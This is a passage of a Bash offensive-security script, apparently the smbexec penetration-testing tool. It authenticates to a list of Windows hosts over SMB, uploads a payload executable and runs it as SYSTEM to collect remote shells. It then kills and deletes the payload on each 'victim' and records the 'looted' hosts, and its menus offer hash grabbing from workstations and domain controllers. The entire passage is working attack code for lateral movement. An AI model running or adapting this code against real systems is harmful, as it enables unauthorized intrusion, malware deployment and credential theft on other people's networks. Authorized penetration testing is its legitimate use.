	SMBFilename=$(cat /tmp/smbexec/filename.rnd).exe #set value for random filename

	echo -e "\n\e[1;33mDuck and Cover...Possible Falling Shells Ahead\e[0m\n"
	
	#prevents rage-quit while remote processes are in play
	dirty=1
	
	for i in $(cat "$RHOSTS"); do
		# Force display output to a file. showconnect provides us an IP for the cleanup function

		$smbexecpath/smbexeclient //$i/$SMBShare -A /tmp/smbexec/smbexec.auth -c "put $LPATH $RPATH\\$SMBFilename ; showconnect" >& /tmp/smbexec/connects.tmp 

		# Check to see what type of error we got so we can tell the user
		f_smbauthinfo

		if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
			echo -e "\e[1;32m[+] Authentication to $i successful...uploading and executing payload\e[0m"
		elif [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
			echo -e "\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
		elif [ ! -z "$logonfail" ]; then
			echo -e "\e[1;31m[-] Authentication to $i failed\e[0m"
		elif [ ! -z "$connrefused" ]; then
			echo -e "\e[1;31m[-] Connection to $i was refused\e[0m"
		elif [ ! -z "$unreachable" ]; then
			echo -e "\e[1;31m[-] There is no host assigned to IP address $i \e[0m"
		else
			echo -e "\e[1;33m[*] I'm not sure what happened, supplying output...\e[0m"
			cat /tmp/smbexec/connects.tmp | egrep -i 'error|fail'
		fi

		# Get successful IP addy for cleanup later
		ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u) 

		# If no successful connection was made above this portion is skipped
		if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
			echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file for the cleanup function
			if [ "$isadmin" == "1" ]; then
				ADMINPATH=$prepath$RPATH
				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			fi

			if [ ! -z $cemptyrpath ]; then
				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C C:\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			fi

			if [ ! -z "$oddshare" ]; then
				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			elif [ ! -z "$superoddshare" ]; then
				#Ugly hack for placing payload in root of shares like Users or Public. May only work for shares on the C drive
				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C \\$SMBShare\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			else
				$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			fi

			echo $! > /tmp/smbexec/winexe.pid #grab the pid so we can kill it
			sleep 10 #give it time to auth, execute payload and migrate
			kill -9 $(cat /tmp/smbexec/winexe.pid) #Kill off the winexe pid because it doesn't seem to exit gracefully
			wait $(cat /tmp/smbexec/winexe.pid) 2>/dev/null #Prevents output from pid kill to be written to screen
		fi

		#Unset the variables because we're in a for-loop
		unset logonfail
		unset connrefused
		unset badshare
		unset unreachable
	done
	
	if [ -s /tmp/smbexec/hosts.loot.tmp ]; then
		echo -e "\n\e[1;33mReady for cleanup!  Hit enter when the shells stop rolling in...\e[0m"
		read
	fi
	f_cleanup
}

f_cleanup(){
	# Cleaning up the victims - killing exploit procs & removing the exe file
	# Only those with successful logins will be hit again

	if [ -s /tmp/smbexec/hosts.loot.tmp ]; then
		cat /tmp/smbexec/hosts.loot.tmp | sed '/^$/d'| sort -u > /tmp/smbexec/hosts.loot
		RHOSTS=/tmp/smbexec/hosts.loot
	fi
	if [ -s /tmp/smbexec/hosts.loot ]; then
		echo -e "\n\e[1;33mGo play with your shells I've gotta clean up the mess you made...\e[0m"

		for i in $(cat $RHOSTS); do
			echo
			echo "***************"
			echo $i
			echo "***************"
			echo -e "\e[1;33mKilling the file process on the victim, please standby\e[0m"
			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C taskkill /IM $SMBFilename /F" &> /tmp/smbexec/error.jnk
			echo -e "\n\e[1;33mRemoving the file from the victim, please standby\e[0m"
			if [ ! -z $cemptyrpath ]; then
				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL C:\\$SMBFilename" &> /tmp/smbexec/error.jnk
			elif [ "$isadmin" == "1" ]; then
				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
			elif [ ! -z "$oddshare" ]; then
				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
			elif [ ! -z "$superoddshare" ]; then
				#Ugly hack for removing payload in root of shares like Users or Public. May only work for shares on the C drive
				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C cd $SMBShare && DEL \\$SMBFilename" &> /tmp/smbexec/error.jnk
			else
				$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
			fi
		done
	else
		echo -e "\n\e[1;33mSorry, no shells. Maybe next time...\e[0m\n\n"
	fi
	
	#prevents rage-quit while remote processes are in play
	if [ $dirty -eq 1 ];then
		dirty=
	fi
    
	# Create a list of ips we successfully exploited unless none were exploited
	if [ -s /tmp/smbexec/hosts.loot ]; then
		mv /tmp/smbexec/hosts.loot $logfldr/$SMBUser.hosts.looted.$DATE
		echo -e "\n\e[1;33mThe list of hosts successfully exploited can be found at $logfldr/$SMBUser.hosts.looted.$DATE\e[0m\n\n"
	fi
	
	echo -en "\e[1;33mHit enter to return to Main Menu\e[0m "
	read -p ""
	
	f_freshstart
	f_mainmenu
}

f_freshstart(){

rm -rf /tmp/smbexec/ # cleanup all the stuff we put in the temp dir

# unset variables to prevent problems in the loop
vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHash SMBPass SMBUser superoddshare tf unreachable datatable linktable"

for var in $vars; do
	unset $var
done

}

f_hashmenu(){
	clear
	f_banner

	echo "1. Workstation & Server Hashes (Local & DCC)"
	echo "2. Domain Controller"
	echo "3. Main Menu"

	read -p "Choice : " hashchoice

	case "$hashchoice" in
		1) f_hashgrab ;;
		2) f_dchashgrab ;;
		3) f_mainmenu ;;
		*) f_hashmenu ;;
	esac

}

f_mainmenu(){
	if [ ! -d /tmp/smbexec/ ]; then mkdir /tmp/smbexec/; fi
	DATE=$(date +"%H%M")
	clear
	f_banner

	echo "1. Local Account"
	echo "2. Domain Account"
	echo "3. Create a host list"
	echo "4. Enumerate Shares"
	echo "5. Create an executable and rc script"
	echo "6. Hash grab"
	echo "7. Exit"

	read -p "Choice : " mainchoice

	case "$mainchoice" in
		1) f_vanish;;
		2) f_vanish;;
		3) f_hosts;;
		4) f_enumshares;;
		5) f_vanish;;
		6) f_hashmenu;;
		7) if [[ -z $(ls $logfldr) ]];then rm -rf $logfldr; fi
		   clear;f_freshstart;exit;;
		*) f_mainmenu
	esac
}

# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!] This script must be run as root\e[0m" 1>&2
	exit 1
else
	f_mainmenu
fi

